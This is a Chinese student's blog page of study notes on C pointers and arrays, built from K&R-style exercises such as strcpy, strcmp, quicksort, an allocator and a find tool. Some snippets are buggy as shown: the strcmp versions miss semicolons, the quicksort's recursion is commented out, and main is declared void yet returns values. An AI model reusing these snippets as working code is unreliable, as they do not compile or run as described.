</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/c%E8%AF%AD%E8%A8%80%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0-%E6%8C%87%E9%92%88%E4%B8%8E%E6%95%B0%E7%BB%84/" title="c语言回炉重造-指针与数组">c语言回炉重造-指针与数组</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-09-30T15:39:17.000Z" title="发表于 2023-09-30 23:39:17">2023-09-30</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-11-16T09:51:09.949Z" title="更新于 2023-11-16 17:51:09">2023-11-16</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/">编程基础</a></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/C%E8%AF%AD%E8%A8%80/">C语言</a></span></div><div class="content">​	回炉重造, 还是通过gdb调试一下,理解的比较好, 多写代码多调试!
指针与地址初探12345678910111213141516#include &lt;stdio.h&gt;void main()&#123;    int x=1,y=2,z[10];    int *ip;    ip = &amp;x;    z[0] = 1;    z[1] = 2;    z[8] = 5;    y = *ip;    *ip = 0;    ip = &amp;z[0];        x = 1;    &#125;

gcc -g main.c
​		ip是一个指针,在第六行,把x的地址赋给了指针,所以ip的值就是x的地址,ip本身就是一个值,也有自己的地址,


​		感觉这种未初始化的数组或许能做信息泄露?




指针与函数参数​		函数传递指针,实现赋值. 主要是getint函数,获取任意值,然后转换成数值,int类型的数值 而不是char类型的数值
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;ctype.h&gt;#include &lt;stdio.h&gt;int getch(void);void ungetch(int);//将输入的字符流分解成整数int getint(int *pn)&#123;	int c,sign;	while(isspace(c = getch())) ;	if (!isdigit(c) &amp;&amp; c !=EOF &amp;&amp; c!=&#x27;+&#x27; &amp;&amp; c !=&#x27;-&#x27;)&#123; //输入不是数字、结束符号,+-符号时返回0		ungetch(c);		return 0;	&#125;	sign = (c == &#x27;-&#x27;) ? -1:1; //获取符号	if (c==&#x27;+&#x27; || c ==&#x27;-&#x27;) 		c = getch();/*原来设想的数可能是 +1  -2这种,所以要先检测一下符号这个循环的意思是, 假如输入了 12345 这种(不是一位的数值), 一个一个读取,然后前一位 乘10,逐级递增,这个没问题,但 c - 0是什么? c的话,本身是 字符 ,这里是减去0 的ascii码,就 取得了 整数 */        for (*pn=0; isdigit(c); c=getch()) 		*pn = 10 * *pn + (c - &#x27;0&#x27;);	*pn *= sign;	if (c != EOF)   //先缓存一下		ungetch(c);	return c;&#125;#define SIZE 10void main()&#123;	int n, array[SIZE],getint(int *);    // 实现给一个整形数组 赋值	for (n=0; n &lt; SIZE &amp;&amp; getint(&amp;array[n]) != EOF; n++)		;	for (n=0; n &lt; SIZE; n++) //打印		printf(&quot;the %d number is %d\n&quot;,n,array[n]);&#125;#define BUFSIZE 100char buf[BUFSIZE];int bufp =0;int getch(void)&#123;	return (bufp &gt; 0 ) ? buf[--bufp] : getchar();&#125;void ungetch(int c)&#123;	if (bufp &gt;= BUFSIZE)		printf(&quot;ungetch: too many characters\n&quot;);	else		buf[bufp++] = c;&#125;



​	
关于 c-‘0’的问题  
12  for (*pn=0; isdigit(c); c=getch()) *pn = 10 * *pn + (c - &#x27;0&#x27;);

​	 输入12345, ascii的话就是49 50 51 52 53问题在于, 对于getchar()得到的数值,会是ascii码, 而直接赋值得到的是内存中数值,所以需要这么一个转换
12345678910111213#include &lt;stdio.h&gt;void main()&#123;	int a=1;	char b = 1;	int c;	c = getchar();	int d;	d = getchar();&#125;

​		虽然但是,a和b还是不一样的,a占用4个字节,b占用一个字节


​		虽然但是,a和b还是不一样的,a占用4个字节,b占用一个字节​		






strlen    注意, 参数处的 *s  和 for循环里的 *s 是两个含义,  一个是代表定义指针, 一个是取指针指向的地址的值,差了两层
12345678int strlen(char *s)&#123;    int n;        for (n=0; *s!=&#x27;\0&#x27;; s++)        n++;    return n;&#125;

版本2, 数组的尾元素+1 (结束\0) 减头元素就是长度,
1234567int strlen(char *s)&#123;    char *p = s;    while(*p != &#x27;\0&#x27;)        p++;    return p-s;&#125;





理解地址算数运算: 一个简单的存储分配程序123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define ALLOCSIZE 10000static char allocbuf[ALLOCSIZE];static char *allocp = allocbuf;char *alloc(int n)&#123;    if (allocbuf + ALLOCSIZE - allocp &gt;= n)&#123; //有足够的空闲空间        allocp += n;        return allocp - n; //分配前的指针p    &#125;else&#123;        return 0;    &#125;    &#125;void afree(char *p) //释放p指向的存储区&#123;    if (p &gt;= allocbuf &amp;&amp; p &lt; allocbuf + ALLOCSIZE)        allocp = p;    &#125;void main()&#123;    char *data1,*data2;    int a;    char src[50] = &quot;hello wolrd&quot;;    char src2[50] = &quot;this is the second mem region&quot;;    data1 = alloc(100);    memcpy(data1,src,strlen(src)+1);    data2 = alloc(200);    memcpy(data2,src2,strlen(src2)+1);    a= 1;&#125;





strcpy的实现实现把指针t指向的字符串复制到指针s指向的位置, 但是不能用s&#x3D;t,因为这个只是拷贝了指针,并没有复制字符串,
数组方法实现:
1234567void strcpy(char *s, char *t)&#123;    int i;    i = 0;    while((s[i] = t[i]) != &#x27;\0&#x27;)        i++;&#125;

指针方法实现:
12345678void strcpy(char *s, char *t)&#123;    while((*s = *t) != &#x27;\0&#x27;)    &#123;        s++;        t++;    &#125;&#125;

经验丰富的程序员更喜欢编写成一下形式:
12345void strcpy(char *s,char *t)&#123;    while ((*s++ = *t++) != &#x27;\0&#x27;)        ;&#125;

还可以进一步缩写,因为和0比较是多余的,while循环的条件本身就需要非0
12345void strcpy(char *s,char *t)&#123;    while (*s++ = *t++)        ;&#125;



strcmp的实现12345678int strcmp(char *s,char *t)&#123;    int i;    for (i=0;s[i] == t[i];i++)        if(s[i] == &#x27;\0&#x27;)            return 0    return s[i] - t[i];&#125;

用指针来实现
1234567int strcmp(char *s,char *t)&#123;    for(;*s == *t;s++,t++)        if (*s == &#x27;\0&#x27;)            return 0    return *s - *t;&#125;



指针数组排序1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define MAXLINES 5000char *lineptr[MAXLINES];int readlines(char *lineptr[],int nlines);void writelines(char *lineptr[],int nlines);void main()&#123;    int nlines;        if ((nlines = readlines(lineptr,MAXLINES)) &gt;=0 )&#123;        qsort(lineptr,0,nlines-1);        writelines(lineptr,nlines);        return 0;    &#125;else&#123;        printf(&quot;error: input too big to sort\n&quot;);        return 1;    &#125;&#125;#define MAXLEN 1000int getline(char *,int);char *alloc(int);int readline(char *lineptr[],int maxlines)&#123;    int len, nlines;    char *p,line[MAXLEN];    nlines = 0;    while((len = getline(line,MAXLEN)) &gt; 0 )    &#123;        if (nlines &gt; maxlines || (p = alloc(len)) == NULL)            return -1;        else&#123;            line[len-1] = &#x27;\0&#x27;;//删除换行符            strcpy(p,line);            lineptr[nlines++] = p;        &#125;    &#125;    return nlines;&#125;void writelines(char *lineptr[],int nlines)&#123;    int i;    for(i = 0;i&lt;nlines;i++)        printf(&quot;%s\n&quot;,lineptr[i]);&#125;void qsort(char *v[], int left,int right)&#123;    int i,last;    void swap(char *v[],int i, int j);    if (left &gt;= right)        return;    swap(v,left,(left+right)/2);    last = left;    for(i = left+1; i&lt;= right; i++)        if (strcmp(v[i],v[left]) &lt; 0 )            swap(v,++last,i);    swap(v,left,last);    qsort(v,left,last-1);    qsort(v,last+1,right);&#125;void swap(char *v[],int i,int j)&#123;    char *temp;    temp = v[i];    v[i] = v[j];    v[j] = temp;&#125;



基础快速排序123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;stdio.h&gt;void swap(int v[],int i,int j);void qsort(int v[],int left,int right);void main()&#123;    int i;    int v[11] = &#123;3,2,9,2,3,7,8,1,6,8,4&#125;;    qsort(v,0,10);    for(i=0;i&lt;11;i++)        printf(&quot;%d,&quot;,v[i]);&#125;void swap(int v[],int i,int j)&#123;    int temp;        temp = v[i];    v[i] = v[j];    v[j] = temp;&#125;// 3,2,9,2,3,7,8,1,6,8,4// 以递增顺序对v[left]到v[right]进行排序void qsort(int v[],int left,int right)&#123;    int i,last;    void swap(int v[],int i,int j);        if (left &gt;= right) return;    swap(v,left, (left+right)/2);    last = left;    for (i = left+1;i&lt;=right;i++)        if (v[i] &lt; v[left])            swap(v,++last,i);    swap(v,left,last);    //qsort(v, left, last-1);    //qsort(v,last+1,right);&#125;举例	3,2,9,2,3,7,8,1,6,8,4    qsort(v,0,10)第一次排序后    4,2,2,3,3,1,6,7,8,8,9第一次把中间的7放到开头,然后对比,依次把小于它的往前放,放到last+1的位置    7,2,9,2,3,3,8,1,6,8,4    7,2,2,9,3,3,8,1,6,8,4    7,2,2,3,9,3,8,1,6,8,4    7,2,2,3,3,9,8,1,6,8,4    7,2,2,3,3,1,8,9,6,8,4    7,2,2,3,3,1,6,9,8,8,4    7,2,2,3,3,1,6,4,8,8,9 //此时last在4这个位置,肯定也是比它小的,而且是最后一个,此时再swap就可以了



多维数组12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;stdio.h&gt;int day_of_year(int year, int month,int day);void month_day(int year,int yearday,int *pmonth,int *pday);void main()&#123;    int choice;    int year,month,day;    int dayofyear;    int dayofmonth;    printf(&quot;请输入选项\n1.将某年某月某日的日期表示形式转换成某年第几天的形式\n2.将某年中第几天的日期表示形式转换为某月某日\n&quot;);    scanf(&quot;%d&quot;,&amp;choice);    switch(choice)&#123;        case 1:            printf(&quot;请输入年月日,空格隔开\n&quot;);            scanf(&quot;%d %d %d&quot;,&amp;year,&amp;month,&amp;day);            dayofyear = day_of_year(year,month,day);            printf(&quot;%d年%d月%d日是%d年第%d天\n&quot;,year,month,day,year,dayofyear);            break;        case 2:            printf(&quot;请输入年份和天数,空格隔开\n&quot;);            scanf(&quot;%d %d&quot;,&amp;year,&amp;day);            month_day(year,day,&amp;month,&amp;dayofmonth);            printf(&quot;%d年第%d天是%d年%d月%d号&quot;,year,day,year,month,dayofmonth);            break;    &#125;&#125;static char daytab[2][13]=&#123;    &#123;0,31,28,31,30,31,30,31,31,30,31,30,31&#125;,    &#123;0,31,29,31,30,31,30,31,31,30,31,30,31&#125;&#125;;//将某年某月某日的日期表示形式转换成某年第几天的形式int day_of_year(int year, int month,int day)&#123;    int i,leap;        leap = year%4 == 0 &amp;&amp; year%100 !=0 || year % 400 ==0;    for(i=1;i&lt; month;i++)        day+= daytab[leap][i];    return day;&#125;//将某年中第几天的日期表示形式转换为某月某日void month_day(int year,int yearday,int *pmonth,int *pday)&#123;    int i,leap;        leap = year%4 == 0 &amp;&amp; year%100 !=0 || year % 400 ==0;    for (i=1;yearday &gt; daytab[leap][i];i++)        yearday -= daytab[leap][i];    *pmonth = i;    *pday = yearday;&#125;







命令行参数 echo第一个版本将argv看成一个字符指针数组
1234567891011#include &lt;stdio.h&gt;int main(int argc,char *argv[])&#123;    int i;        for (i=0; i&lt;argc; i++)        printf(&quot;%s%s&quot;,argv[i],(i &lt; argc-1) ? &quot; &quot;: &quot;&quot;);    printf(&quot;\n&quot;);    return 0;&#125;



因为argv是一个指向指针数组的指针,所以,可以通过指针而非数组下标的方式处理命令行参数.
第二个版本是在对argv进行自增运算、对argc进行自减运算的基础上实现的(argv是一个指向char类型的指针的指针)
123456789#include &lt;stdio.h&gt;int main(int argc,char *argv[])&#123;    while( --argc &gt; 0)        printf(&quot;%s%s&quot;,*++argv,(argc &gt; 1)? &quot; &quot;:&quot;&quot;);    printf(&quot;\n&quot;);    return 0;&#125;

模式查找程序4.1节  内置了查找模式
​		将输入中包含特定“模式”或字符串的各行打印出来(grep的特例相当于)
12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;stdio.h&gt;#define MAXLINE 1000int getline1(char line[],int max);int strindex(char source[],char searchfor[]);    char pattern[] = &quot;tang&quot;;    int main()&#123;    char line[MAXLINE];    int found = 0;    while (getline1(line,MAXLINE) &gt; 0 )        if(strindex(line,pattern) &gt;= 0 )&#123;            printf(&quot;%s&quot;,line);            found++;        &#125;    return found;&#125;//将行保存到s中,并返回该行的长度int getline1(char s[],int lim)&#123;    int c,i;    i = 0;    while(--lim &gt;0 &amp;&amp; (c=getchar()) != EOF &amp;&amp; c != &#x27;\n&#x27;)        s[i++] = c;    if(c==&#x27;\n&#x27;)        s[i++] = c;    s[i] = &#x27;\0&#x27;;    return i;&#125;// 返回t在s中的位置,如果没找到返回-1int strindex(char s[],char t[])&#123;    int i,j,k;        for (i=0; s[i] !=&#x27;\0&#x27;;i++)&#123;        for(j = i,k=0; t[k]!=&#x27;\0&#x27; &amp;&amp; s[j]==t[k];j++,k++)            ;        if (k &gt; 0 &amp;&amp; t[k] == &#x27;\0&#x27;)            return i;    &#125;    return -1;&#125;



5.10 增强版 实现find功能,打印与第一个参数指定的模式匹配的行
1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define MAXLINE 1000int getline1(char *line, int max);//int main(int argc,char *argv[])&#123;    char line[MAXLINE];    int found = 0;    if (argc !=2 )        printf(&quot;Usage: find pattern\n&quot;);    else        while(getline1(line,MAXLINE) &gt; 0)            if (strstr(line,argv[1]) != NULL)&#123;                printf(&quot;%s&quot;,line);                found++;            &#125;    return found;&#125;int getline1(char s[],int lim)&#123;    int c,i;    i = 0;    while(--lim &gt;0 &amp;&amp; (c=getchar()) != EOF &amp;&amp; c != &#x27;\n&#x27;)        s[i++] = c;    if(c==&#x27;\n&#x27;)        s[i++] = c;    s[i] = &#x27;\0&#x27;;    return i;&#125;



再次改进
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;stdio.h&gt;#include &lt;string.h&gt;#define MAXLINE 1000int getline1(char *line, int max);//int main(int argc,char *argv[])&#123;    char line[MAXLINE];    long lineno = 0;    int c,except = 0, number = 0, found =0;        while(--argc &gt; 0 &amp;&amp; (*++argv)[0] == &#x27;-&#x27;)        while(c = *++argv[0])   //这里的++...........是那个意思?            switch(c)&#123;                case &#x27;x&#x27;:                    except = 1;                    break;                case &#x27;n&#x27;:                    number = 1;                    break;                default:                    printf(&quot;find: illegal option %c\n&quot;,c);                    argc = 0;                    found = -1;                    break;                   &#125;        if (argc !=1 )        printf(&quot;Usage: find -x -n pattern\n&quot;);    else        while(getline1(line,MAXLINE) &gt; 0)&#123;         	lineno++;               if ((strstr(line,*argv) != NULL)!= except)&#123;                if(number)                    printf(&quot;%ld:&quot;,lineno);                printf(&quot;%s&quot;,line);                found++;            &#125;        &#125;    return found;&#125;int getline1(char s[],int lim)&#123;    int c,i;    i = 0;    while(--lim &gt;0 &amp;&amp; (c=getchar()) != EOF &amp;&amp; c != &#x27;\n&#x27;)        s[i++] = c;    if(c==&#x27;\n&#x27;)        s[i++] = c;    s[i] = &#x27;\0&#x27;;    return i;&#125;



函数指针123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define ALLOCSIZE 10000#define MAXLINES 5000#define MAXLEN 1000char *lineptr[MAXLINES];int readlines(char *lineptr[],int maxlines);void writelines(char *lineptr[],int nlines);void qsort1(void *v[], int left,int right,int (*comp)(void *,void *));int numcmp(char *,char *);int getline1(char *line, int max);char *alloc(int n);//对输入的文本进行排序int main(int argc,char *argv[])&#123;    int nlines; //读入的输入行数    int numeric = 0; //若进行数值排序,则 numberic的值为1        if(argc &gt; 1 &amp;&amp; strcmp(argv[1],&quot;-n&quot;) == 0)        numeric = 1;    if ((nlines = readlines(lineptr,MAXLINES)) &gt;= 0)&#123;        qsort1((void **)lineptr, 0, nlines -1, (int (*)(void*,void*))(numeric ? numcmp:strcmp));        writelines(lineptr, nlines);        return 0;    &#125;else&#123;        printf(&quot;input too big to sort\n&quot;);        return 1;    &#125;    &#125;int readlines(char *lineptr[],int maxlines)&#123;    int len, nlines;    char *p,line[MAXLEN];    nlines = 0;    while((len = getline1(line,MAXLEN)) &gt; 0 )    &#123;        if (nlines &gt; maxlines || (p = alloc(len)) == NULL)            return -1;        else&#123;            line[len-1] = &#x27;\0&#x27;;//删除换行符            strcpy(p,line);            lineptr[nlines++] = p;        &#125;    &#125;    return nlines;&#125;void writelines(char *lineptr[],int nlines)&#123;    int i;    for(i = 0;i&lt;nlines;i++)        printf(&quot;%s\n&quot;,lineptr[i]);&#125;void qsort1(void *v[], int left,int right,int (*comp)(void *,void *))&#123;    int i,last;    void swap(void *v[],int i, int j);    if (left &gt;= right)        return;    swap(v,left,(left+right)/2);    last = left;    for(i = left+1; i&lt;= right; i++)        if ((*comp)(v[i],v[left]) &lt; 0 )            swap(v,++last,i);    swap(v,left,last);    qsort1(v,left,last-1,comp);    qsort1(v,last+1,right,comp);&#125;int numcmp(char *s1, char *s2)&#123;    double v1,v2;        v1 = atof(s1);    v2 = atof(s2);    if (v1&lt;v2)        return -1;    else if (v1 &gt; v2)        return 1;    else        return 0;&#125;void swap(void *v[],int i,int j)&#123;    char *temp;    temp = v[i];    v[i] = v[j];    v[j] = temp;&#125;int getline1(char s[],int lim)&#123;    int c,i;    i = 0;    while(--lim &gt;0 &amp;&amp; (c=getchar()) != EOF &amp;&amp; c != &#x27;\n&#x27;)        s[i++] = c;    if(c==&#x27;\n&#x27;)        s[i++] = c;    s[i] = &#x27;\0&#x27;;    return i;&#125;static char allocbuf[ALLOCSIZE];static char *allocp = allocbuf;char *alloc(int n)&#123;    if (allocbuf + ALLOCSIZE - allocp &gt;= n)&#123; //有足够的空闲空间        allocp += n;        return allocp - n; //分配前的指针p    &#125;else&#123;        return 0;    &#125;    &#125;



(void **)是啥, 将指针数组转换成 指向指针数组的指针类型
复杂声明程序dcl是啥
1234char **argv    argv: pointer to pointer to charint (*daytab)[13]    daytab: pointer to array[13] of int





q能不能用gdb显示变量信息呢,结构信息等,比如char和int的区别
EOF的话,包括哪些
</div></div></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/"><i class="fas fa-chevron-left fa-fw"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/#content-inner">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/#content-inner">9</a><a class="extend next" rel="next" href="/page/3/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/profile.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">唐仔橙</div><div class="author-info__description">喜欢探索世界,在读研究生,计算机爱好者的成长记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">88</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/tangzichengcc"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tangzichengcc" target="_blank" title="Github"><i class="fab fa-github"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">会记录自己的学习经历,以及一些经历,如果有想法或者疑惑,欢迎交流!!</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-55-iofile%E5%85%A5%E9%97%A8%E4%B9%8Bvtable%E5%8A%AB%E6%8C%81/" title="pwn入门-55-iofile入门之vtable劫持"><img src="/img/background/10.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-55-iofile入门之vtable劫持"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-55-iofile%E5%85%A5%E9%97%A8%E4%B9%8Bvtable%E5%8A%AB%E6%8C%81/" title="pwn入门-55-iofile入门之vtable劫持">pwn入门-55-iofile入门之vtable劫持</a><time datetime="2024-02-11T08:43:00.000Z" title="发表于 2024-02-11 16:43:00">2024-02-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-54-exit-hook%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/" title="pwn入门-54-exit_hook函数利用"><img src="/img/background/12.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-54-exit_hook函数利用"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-54-exit-hook%E5%87%BD%E6%95%B0%E5%88%A9%E7%94%A8/" title="pwn入门-54-exit_hook函数利用">pwn入门-54-exit_hook函数利用</a><time datetime="2024-02-11T08:01:29.000Z" title="发表于 2024-02-11 16:01:29">2024-02-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-53-glibc%E4%B9%8Bmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" title="pwn入门-53-glibc之malloc源码分析"><img src="/img/background/5.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-53-glibc之malloc源码分析"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-53-glibc%E4%B9%8Bmalloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" title="pwn入门-53-glibc之malloc源码分析">pwn入门-53-glibc之malloc源码分析</a><time datetime="2024-02-11T05:40:56.000Z" title="发表于 2024-02-11 13:40:56">2024-02-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-52-iofile%E7%BB%93%E5%90%88%E7%89%B9%E6%AE%8Agadget%E8%BF%9B%E8%A1%8Crop/" title="pwn入门-52-iofile结合特殊gadget进行rop"><img src="/img/background/8.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-52-iofile结合特殊gadget进行rop"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-52-iofile%E7%BB%93%E5%90%88%E7%89%B9%E6%AE%8Agadget%E8%BF%9B%E8%A1%8Crop/" title="pwn入门-52-iofile结合特殊gadget进行rop">pwn入门-52-iofile结合特殊gadget进行rop</a><time datetime="2024-02-10T12:22:28.000Z" title="发表于 2024-02-10 20:22:28">2024-02-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/pwn%E5%85%A5%E9%97%A8-51-IO-obstack-jumps%E5%88%A9%E7%94%A8/" title="pwn入门-51-_IO_obstack_jumps利用"><img src="/img/background/8.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn入门-51-_IO_obstack_jumps利用"/></a><div class="content"><a class="title" href="/pwn%E5%85%A5%E9%97%A8-51-IO-obstack-jumps%E5%88%A9%E7%94%A8/" title="pwn入门-51-_IO_obstack_jumps利用">pwn入门-51-_IO_obstack_jumps利用</a><time datetime="2024-02-10T12:21:41.000Z" title="发表于 2024-02-10 20:21:41">2024-02-10</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
            <i class="fas fa-folder-open"></i>
            <span>分类</span>
            <a class="card-more-btn" href="/categories/" title="查看更多">
    <i class="fas fa-angle-right"></i></a>
            </div>
            <ul class="card-category-list" id="aside-cat-list">
            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/FUZZ/"><span class="card-category-list-name">FUZZ</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/IOT/"><span class="card-category-list-name">IOT</span><span class="card-category-list-count">3</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/"><span class="card-category-list-name">PWN</span><span class="card-category-list-count">53</span></a><ul class="card-category-list child"><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/%E8%99%9A%E6%8B%9F%E5%8C%96/"><span class="card-category-list-name">虚拟化</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/PWN/%E8%B0%83%E8%AF%95/"><span class="card-category-list-name">调试</span><span class="card-category-list-count">1</span></a></li></ul></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span class="card-category-list-name">漏洞复现</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%94%9F%E6%B4%BB/"><span class="card-category-list-name">生活</span><span class="card-category-list-count">2</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/%E7%A7%91%E7%A0%94-%E5%B9%B6%E6%B2%A1%E6%9C%89/"><span class="card-category-list-name">科研(并没有)</span><span class="card-category-list-count">1</span></a></li>
            </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/" style="font-size: 1.3em; color: rgb(121, 6, 28)">路由器</a><a href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/" style="font-size: 1.15em; color: rgb(67, 70, 118)">浏览器安全</a><a href="/tags/csapp/" style="font-size: 1.15em; color: rgb(11, 51, 139)">csapp</a><a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.3em; color: rgb(138, 174, 136)">C语言</a><a href="/tags/%E6%97%85%E6%B8%B8/" style="font-size: 1.15em; color: rgb(62, 80, 156)">旅游</a><a href="/tags/PWN%E5%85%A5%E9%97%A8/" style="font-size: 1.45em; color: rgb(45, 48, 41)">PWN入门</a><a href="/tags/%E5%A0%86/" style="font-size: 1.15em; color: rgb(138, 124, 101)">堆</a><a href="/tags/docker/" style="font-size: 1.15em; color: rgb(43, 40, 115)">docker</a><a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size: 1.15em; color: rgb(69, 196, 67)">脚本</a><a href="/tags/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B/" style="font-size: 1.38em; color: rgb(169, 191, 92)">研究生课程</a><a href="/tags/%E8%AF%97%E6%AD%8C/" style="font-size: 1.15em; color: rgb(140, 123, 58)">诗歌</a><a href="/tags/%E8%B0%83%E8%AF%95/" style="font-size: 1.15em; color: rgb(121, 96, 199)">调试</a><a href="/tags/KVM/" style="font-size: 1.22em; color: rgb(79, 74, 122)">KVM</a><a href="/tags/USENIX/" style="font-size: 1.15em; color: rgb(41, 176, 83)">USENIX</a><a href="/tags/%E8%AE%BA%E6%96%87/" style="font-size: 1.15em; color: rgb(200, 167, 109)">论文</a></div></div><div class="card-widget card-archives"><div class="item-headline"><i class="fas fa-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="fas fa-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><span class="card-archive-list-count">6</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><span class="card-archive-list-count">2</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">十月 2023</span><span class="card-archive-list-count">6</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><span class="card-archive-list-count">7</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><span class="card-archive-list-count">3</span></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><span class="card-archive-list-count">8</span></a></li></ul></div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站资讯</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">88</div></div><div class="webinfo-item"><div class="item-name">已运行时间 :</div><div class="item-count" id="runtimeshow" data-publishDate="2022-10-02T16:00:00.000Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总访问量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2024-02-11T08:49:49.619Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div 